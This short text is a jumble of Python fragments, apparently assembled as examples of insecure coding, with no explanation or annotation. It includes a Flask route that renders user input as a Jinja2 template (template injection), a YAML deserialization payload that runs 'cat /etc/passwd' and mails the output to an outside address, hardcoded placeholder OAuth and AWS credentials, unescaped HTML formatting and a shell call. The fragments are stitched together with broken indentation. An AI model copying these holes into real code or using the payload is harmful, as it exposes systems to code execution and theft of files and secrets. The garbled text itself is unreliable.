@app.route("/page")
def page():

    name = request.values.get('name')

    output = Jinja2.from_string('Hello ' + name + '!').render()

    return output
    !!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
    
    TWITTER_OAUTH_TOKEN = "dkedjekdjekldjekldje"
    TWITTER_OAUTH_SECRET = "dkejkdjekdjkejdkjekdjekjdkjed"
    AWS_CREDENTIALS = { 'key': 'djekjdkejde', 'secret': 'dncndmncdmncd' }
    LOG_SERVER = "secret.logging.internal.mozilla.com"
    response = "<html>%s</html>" % something

import commands
template_vars['output'] = commands.getstatusoutput('/usr/bin/process_soemthing')
